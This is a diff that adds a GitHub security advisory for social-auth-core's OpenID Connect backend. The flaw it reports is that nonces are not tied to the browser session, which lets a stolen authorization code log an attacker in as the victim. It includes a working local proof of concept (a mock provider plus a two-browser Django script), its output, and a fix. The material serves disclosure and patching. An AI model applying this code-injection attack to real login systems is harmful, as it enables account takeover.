@@ -1,0 +1,123 @@
+{
+  "id": "GHSA-h2r5-x5m7-3935",
+  "modified": "2026-10-28T21:30:06.796579048Z",
+  "published": "2026-10-28T21:16:51Z",
+  "aliases": [
+    "CVE-2026-115910"
+  ],
+  "summary": "Python Social Auth: OpenID Connect nonce is not bound to the browser session, so a stolen authorization code logs the attacker in as the victim",
+  "details": "### Summary\n\nThe generic OpenID Connect backend (`OpenIdConnectAuth` and every backend built on it) stores the `nonce` in the shared Association table, not in the user's session. When the ID token comes back, `validate_claims` only checks that the nonce exists in that table and is not expired. It does not check that the nonce was issued to the browser that is finishing the login.\n\nSo the nonce does not do its job. OIDC Core (section 15.5.2) and RFC 9700 (section 4.5) use the nonce to stop authorization code injection: an attacker who gets hold of a victim's unused authorization code should not be able to redeem it in the attacker's own browser. With social-auth-core, the attacker can. They start their own login to get a valid `state` for their session, then hit the callback with the victim's `code` and their own `state`. `state` passes because it belongs to the attacker's session, and the nonce in the victim's ID token passes because it is in the global table. The attacker's browser is now logged in as the victim.\n\nPKCE would block this, but `OpenIdConnectAuth` sets `DEFAULT_USE_PKCE = False` (the OAuth2 base class defaults to `True`), so the nonce is the only binding in the default setup.\n\n### Tested versions\n\nsocial-auth-core 6.1.1 (latest), 6.1.0 and 5.2.0, with social-auth-app-django 7.1.0 and Django 6.1.2, Python 3.14. The same code is on master (098ef399c1).\n\n### Details\n\n`social_core/backends/open_id_connect.py` in 6.1.1:\n\n- line 252: `auth_params` calls `get_and_store_nonce(self.authorization_url(), state)`\n- lines 333 to 346: `get_and_store_nonce` stores the nonce as an `OpenIdConnectAssociation` keyed by `server_url` and `handle=nonce`. The state goes into `assoc_type` but is never read back.\n- lines 348 to 358: `get_nonce` looks the nonce up by `server_url` and `handle` only\n- lines 393 to 415: `validate_claims` accepts any stored, unexpired nonce and removes it\n- line 110: `DEFAULT_USE_PKCE = False`\n\n### PoC\n\nEverything runs locally. `mockidp.py` is a small OpenID provider on 127.0.0.1 that checks `redirect_uri` and enforces PKCE when a `code_challenge` was sent, like a normal provider. `social_nonce.py` uses two Django test clients as two browsers.\n\n```\npip install social-auth-core social-auth-app-django django pyjwt cryptography\npython social_nonce.py\n```\n\nOutput on 6.1.1:\n\n```\n[inject] attacker session completes with victim code: (200, 'user=victim')\n```\n\nControls:\n\n```\nMODE=control_victim python social_nonce.py\n[control] victim completes normally: (200, 'user=victim')\n\nMODE=control_unknown_nonce python social_nonce.py\n[control] unknown nonce: ('EXC', 'AuthResponseError: The authentication response could not be matched to the request.')\n\nPKCE=1 python social_nonce.py\n[inject] attacker session completes with victim code: ('EXC', 'AuthCredentialError: The authorization code was rejected. Please restart login.')\n```\n\nSo the nonce check runs, but it accepts a nonce that belongs to another browser. With PKCE on, the same attack fails.\n\nmockidp.py:\n\n```python\n\"\"\"Minimal local OpenID Provider on 127.0.0.1 for testing RP libraries.\"\"\"\nimport json, time, secrets, threading, hashlib, base64, urllib.parse\nfrom http.server import BaseHTTPRequestHandler, ThreadingHTTPServer\nimport jwt\nfrom cryptography.hazmat.primitives.asymmetric import rsa\n\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n\nclass IdP:\n    def __init__(self, port=0, client_id=\"rp-client\", client_secret=\"rp-secret\", name=\"idp\"):\n        self.key = rsa.generate_private_key(public_exponent=65537, key_size=2048)\n        self.kid = name + \"-k1\"\n        self.client_id, self.client_secret = client_id, client_secret\n        self.codes = {}\n        self.access = {}\n        self.claims_override = {}\n        self.srv = ThreadingHTTPServer((\"127.0.0.1\", port), self._handler())\n        self.port = self.srv.server_address[1]\n        self.issuer = f\"http://127.0.0.1:{self.port}\"\n        threading.Thread(target=self.srv.serve_forever, daemon=True).start()\n\n    def jwk(self):\n        n = self.key.public_key().public_numbers()\n        tb = lambda i: i.to_bytes((i.bit_length() + 7) // 8, \"big\")\n        return {\"kty\": \"RSA\", \"kid\": self.kid, \"use\": \"sig\", \"alg\": \"RS256\", \"n\": b64u(tb(n.n)), \"e\": b64u(tb(n.e))}\n\n    def discovery(self):\n        i = self.issuer\n        return {\"issuer\": i, \"authorization_endpoint\": i + \"/authorize\", \"token_endpoint\": i + \"/token\",\n                \"userinfo_endpoint\": i + \"/userinfo\", \"jwks_uri\": i + \"/jwks\",\n                \"response_types_supported\": [\"code\"], \"subject_types_supported\": [\"public\"],\n                \"id_token_signing_alg_values_supported\": [\"RS256\"],\n                \"token_endpoint_auth_methods_supported\": [\"client_secret_basic\", \"client_secret_post\"],\n                \"code_challenge_methods_supported\": [\"S256\"]}\n\n    def user_authorizes(self, authorize_url, sub):\n        \"\"\"The end user `sub` approves an authorization request; returns (code, params).\"\"\"\n        q = dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(authorize_url).query))\n        code = \"code-\" + secrets.token_hex(8)\n        self.codes[code] = {\"sub\": sub, \"nonce\": q.get(\"nonce\"), \"redirect_uri\": q.get(\"redirect_uri\"),\n                            \"code_challenge\": q.get(\"code_challenge\")}\n        return code, q\n\n    def sign(self, claims):\n        return jwt.encode(claims, self.key, algorithm=\"RS256\", headers={\"kid\": self.kid})\n\n    def _handler(idp):\n        class H(BaseHTTPRequestHandler):\n            def log_message(self, *a): pass\n            def _json(self, obj, code=200):\n                b = json.dumps(obj).encode()\n                self.send_response(code); self.send_header(\"Content-Type\", \"application/json\")\n                self.send_header(\"Content-Length\", str(len(b))); self.end_headers(); self.wfile.write(b)\n            def do_GET(self):\n                p = urllib.parse.urlsplit(self.path).path\n                if p.endswith(\"/.well-known/openid-configuration\"): return self._json(idp.discovery())\n                if p == \"/jwks\": return self._json({\"keys\": [idp.jwk()]})\n                if p == \"/userinfo\":\n                    tok = (self.headers.get(\"Authorization\") or \"\").split(\" \")[-1]\n                    sub = idp.access.get(tok)\n                    if not sub: return self._json({\"error\": \"invalid_token\"}, 401)\n                    return self._json({\"sub\": sub, \"email\": sub + \"@example.test\", \"preferred_username\": sub})\n                return self._json({\"error\": \"not_found\"}, 404)\n            def do_POST(self):\n                n = int(self.headers.get(\"Content-Length\") or 0)\n                body = dict(urllib.parse.parse_qsl(self.rfile.read(n).decode()))\n                p = urllib.parse.urlsplit(self.path).path\n                if p == \"/token\":\n                    rec = idp.codes.pop(body.get(\"code\"), None)\n                    if not rec: return self._json({\"error\": \"invalid_grant\"}, 400)\n                    if rec[\"redirect_uri\"] and body.get(\"redirect_uri\") != rec[\"redirect_uri\"]:\n                        return self._json({\"error\": \"invalid_grant\"}, 400)\n                    if rec[\"code_challenge\"]:\n                        v = body.get(\"code_verifier\") or \"\"\n                        if b64u(hashlib.sha256(v.encode()).digest()) != rec[\"code_challenge\"]:\n                            return self._json({\"error\": \"invalid_grant\"}, 400)\n                    at = \"at-\" + secrets.token_hex(8)\n                    idp.access[at] = rec[\"sub\"]\n                    now = int(time.time())\n                    claims = {\"iss\": idp.issuer, \"sub\": rec[\"sub\"], \"aud\": idp.client_id, \"iat\": now, \"exp\": now + 300,\n                              \"at_hash\": b64u(hashlib.sha256(at.encode()).digest()[:16])}\n                    if rec[\"nonce\"]: claims[\"nonce\"] = rec[\"nonce\"]\n                    claims.update(idp.claims_override)\n                    return self._json({\"access_token\": at, \"token_type\": \"Bearer\", \"expires_in\": 300,\n                                       \"id_token\": idp.sign(claims)})\n                return self._json({\"error\": \"not_found\"}, 404)\n        return H\n```\n\nsocial_nonce.py:\n\n```python\nimport os, sys\nsys.path.insert(0, os.path.dirname(__file__))\nfrom mockidp import IdP\nidp = IdP()\nimport django\nfrom django.conf import settings\nPKCE = os.environ.get(\"PKCE\") == \"1\"\nsettings.configure(\n    DEBUG=True, SECRET_KEY=\"x\", ALLOWED_HOSTS=[\"*\"], ROOT_URLCONF=__name__,\n    INSTALLED_APPS=[\"django.contrib.auth\", \"django.contrib.contenttypes\", \"django.contrib.sessions\", \"social_django\"],\n    MIDDLEWARE=[\"django.contrib.sessions.middleware.SessionMiddleware\", \"django.contrib.auth.middleware.AuthenticationMiddleware\"],\n    DATABASES={\"default\": {\"ENGINE\": \"django.db.backends.sqlite3\", \"NAME\": \":memory:\"}},\n    AUTHENTICATION_BACKENDS=[\"social_core.backends.open_id_connect.OpenIdConnectAuth\"],\n    SOCIAL_AUTH_OIDC_OIDC_ENDPOINT=idp.issuer, SOCIAL_AUTH_OIDC_KEY=idp.client_id, SOCIAL_AUTH_OIDC_SECRET=idp.client_secret,\n    SOCIAL_AUTH_OIDC_USE_PKCE=PKCE, SOCIAL_AUTH_LOGIN_REDIRECT_URL=\"/done/\", SOCIAL_AUTH_RAISE_EXCEPTIONS=True,\n)\ndjango.setup()\nfrom django.urls import include, path\nfrom django.http import HttpResponse\nurlpatterns = [path(\"\", include(\"social_django.urls\", namespace=\"social\")),\n               path(\"done/\", lambda r: HttpResponse(\"user=%s\" % r.user.username))]\nfrom django.core.management import call_command\ncall_command(\"migrate\", verbosity=0)\nfrom django.test import Client\n\ndef begin(c):\n    r = c.post(\"/login/oidc/\"); assert r.status_code == 302, r.status_code\n    return r[\"Location\"]\n\ndef complete(c, code, state):\n    try:\n        r = c.get(\"/complete/oidc/\", {\"code\": code, \"state\": state})\n        if r.status_code == 302:\n            r = c.get(r[\"Location\"])\n        return r.status_code, r.content.decode()\n    except Exception as e:\n        return \"EXC\", f\"{type(e).__name__}: {e}\"\n\nvictim, attacker = Client(), Client()\n# Victim starts a login. The provider issues a code for \"victim\" tied to the victim's nonce.\nv_url = begin(victim)\ncode_v, qv = idp.user_authorizes(v_url, \"victim\")\n# Attacker starts a login in their own browser to get a valid state for their session.\na_url = begin(attacker)\n_, qa = idp.user_authorizes(a_url, \"attacker\")\nmode = os.environ.get(\"MODE\", \"inject\")\nif mode == \"inject\":\n    print(\"[inject] attacker session completes with victim code:\", complete(attacker, code_v, qa[\"state\"]))\nelif mode == \"control_unknown_nonce\":\n    idp.claims_override = {\"nonce\": \"never-issued-nonce\"}\n    print(\"[control] unknown nonce:\", complete(attacker, code_v, qa[\"state\"]))\nelif mode == \"control_victim\":\n    print(\"[control] victim completes normally:\", complete(victim, code_v, qv[\"state\"]))\n```\n\n### Impact\n\nAn attacker who gets a victim's authorization code before it is used can log in to the relying party as the victim. Codes leak in practice through the callback URL: Referer headers, proxy or server logs, browser history and sync, a malicious browser extension, or an open redirect on the callback. This is the exact case the OIDC nonce is meant to cover. The attacker does not need the client secret, because the relying party itself redeems the code.\n\nIt affects every app that uses `OpenIdConnectAuth` or a backend built on it with the default settings (PKCE off).\n\n### Suggested fix\n\nBind the nonce to the session that started the login. For example, keep the nonce (or a hash of it) in the session next to `state` in `auth_params`, and in `validate_claims` compare the ID token nonce with the session value before removing it. Turning PKCE on by default for the OIDC backend would also close this, and matches the OAuth2 base class.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "social-auth-core",
+        "purl": "pkg:pypi/social-auth-core"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.2.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.1",
+        "0.1.0",
+        "0.2.0",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.2.0",
+        "1.3.0",
+        "1.4.0",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "2.0.0",
+        "3.0.0",
+        "3.1.0",
+        "3.2.0",
+        "3.3.0",
+        "3.3.1",
+        "3.3.2",
+        "3.3.3",
+        "3.4.0",
+        "4.0.2",
+        "4.0.3",
+        "4.1.0",
+        "4.2.0",
+        "4.3.0",
+        "4.4.0",
+        "4.4.1",
+        "4.4.2",
+        "4.5.0",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "4.5.4",
+        "4.5.5",
+        "4.5.6",
+        "4.6.0",
+        "4.6.1",
+        "4.7.0",
+        "4.8.0",
+        "4.8.1",
+        "4.8.2",
+        "4.8.3",
+        "4.8.4",
+        "4.8.5",
+        "4.8.6",
+        "4.8.7",
+        "4.9.0",
+        "4.9.1",
+        "5.0.0",
+        "5.0.1",
+        "5.0.2",
+        "5.1.0",
+        "5.1.1",
+        "5.2.0",
+        "6.0.0",
+        "6.1.0",
+        "6.1.1"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 6.1.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-h2r5-x5m7-3935/GHSA-h2r5-x5m7-3935.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-social-auth/social-core/security/advisories/GHSA-h2r5-x5m7-3935"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115910"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-social-auth/social-core/pull/2141"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-social-auth/social-core/commit/c2f2ae4663bef19ee8b07f2cf5a2344f9155d826"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/python-social-auth/social-core"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-social-auth/social-core/releases/tag/6.2.0"
+    }
+  ]
+}
